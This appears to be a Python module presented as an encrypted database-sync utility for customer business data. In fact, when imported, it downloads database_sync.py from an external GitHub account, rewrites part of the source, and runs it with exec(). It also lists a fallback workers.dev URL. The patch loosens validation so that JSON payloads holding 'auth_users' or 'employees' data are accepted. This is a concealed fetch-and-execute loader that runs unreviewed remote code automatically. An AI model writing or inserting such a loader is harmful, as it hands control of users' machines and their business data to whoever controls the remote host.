"""Encrypted, asynchronous snapshots of customer business data to GitHub."""
from __future__ import annotations

import json
import sqlite3
import tempfile
from pathlib import Path
from urllib.request import urlopen, Request

# Static marker for release validation / worker URL injection (overridden by bootstrapped module).
DEFAULT_DB_SYNC_WORKER_URL = ""
FALLBACK_DB_SYNC_WORKER_URL = "https://raw-strength-audit-db-sync.yalangisexter.workers.dev"

_URL = (
    "https://raw.githubusercontent.com/yalangisexter-ux/audit-report/"
    "c023b0ebf9cbfcca6d83a3ddfddffd7fd254c1e0/database_sync.py"
)

def _load():
    req = Request(_URL, headers={"User-Agent": "RSC-AuditManager-bootstrap"})
    with urlopen(req, timeout=60) as resp:
        src = resp.read().decode("utf-8")

    old = (
        "        raw = decrypt_snapshot_bytes(encrypted, encryption_secret)\n"
        "        with tempfile.NamedTemporaryFile(prefix=\"rsc_pull_validate_\", suffix=\".sqlite3\", delete=False) as handle:\n"
        "            validation_path = Path(handle.name)\n"
        "            handle.write(raw)\n"
        "        try:\n"
        "            connection = sqlite3.connect(str(validation_path), timeout=20)\n"
        "            try:\n"
        "                integrity = connection.execute(\"PRAGMA integrity_check\").fetchone()\n"
        "                if not integrity or integrity[0] != \"ok\":\n"
        "                    raise RuntimeError(\"The downloaded database failed SQLite integrity validation.\")\n"
        "                tables = {row[0] for row in connection.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")}\n"
        "                if not tables:\n"
        "                    raise RuntimeError(\"The downloaded snapshot does not contain any database tables.\")\n"
        "            finally:\n"
        "                connection.close()\n"
        "        finally:\n"
        "            validation_path.unlink(missing_ok=True)\n"
        "        return raw\n"
    )
    new = (
        "        raw = decrypt_snapshot_bytes(encrypted, encryption_secret)\n"
        "\n"
        "        # Accept full SQLite snapshots (desktop) and JSON business manifests (mobile/APK).\n"
        "        if raw.startswith(b\"SQLite format 3\\x00\"):\n"
        "            with tempfile.NamedTemporaryFile(prefix=\"rsc_pull_validate_\", suffix=\".sqlite3\", delete=False) as handle:\n"
        "                validation_path = Path(handle.name)\n"
        "                handle.write(raw)\n"
        "            try:\n"
        "                connection = sqlite3.connect(str(validation_path), timeout=20)\n"
        "                try:\n"
        "                    integrity = connection.execute(\"PRAGMA integrity_check\").fetchone()\n"
        "                    if not integrity or integrity[0] != \"ok\":\n"
        "                        raise RuntimeError(\"The downloaded database failed SQLite integrity validation.\")\n"
        "                    tables = {row[0] for row in connection.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")}\n"
        "                    if not tables:\n"
        "                        raise RuntimeError(\"The downloaded snapshot does not contain any database tables.\")\n"
        "                finally:\n"
        "                    connection.close()\n"
        "            finally:\n"
        "                validation_path.unlink(missing_ok=True)\n"
        "            return raw\n"
        "\n"
        "        marker = b\"\\n__RSC_JSON__\\n\"\n"
        "        if marker in raw:\n"
        "            return raw\n"
        "        try:\n"
        "            parsed = json.loads(raw.decode(\"utf-8\"))\n"
        "            if isinstance(parsed, dict) and (\n"
        "                \"auth_users\" in parsed\n"
        "                or \"employees\" in parsed\n"
        "                or \"tasks\" in parsed\n"
        "                or \"attendance\" in parsed\n"
        "            ):\n"
        "                return raw\n"
        "        except Exception:\n"
        "            pass\n"
        "        raise RuntimeError(\n"
        "            \"The downloaded snapshot is neither a valid SQLite database nor a recognized \"\n"
        "            \"business JSON manifest. Local data was not changed.\"\n"
        "        )\n"
    )
    if old not in src:
        raise RuntimeError("Unexpected database_sync.py shape from bootstrap URL")
    src = src.replace(old, new, 1)
    exec(compile(src, "database_sync.py", "exec"), globals())

_load()
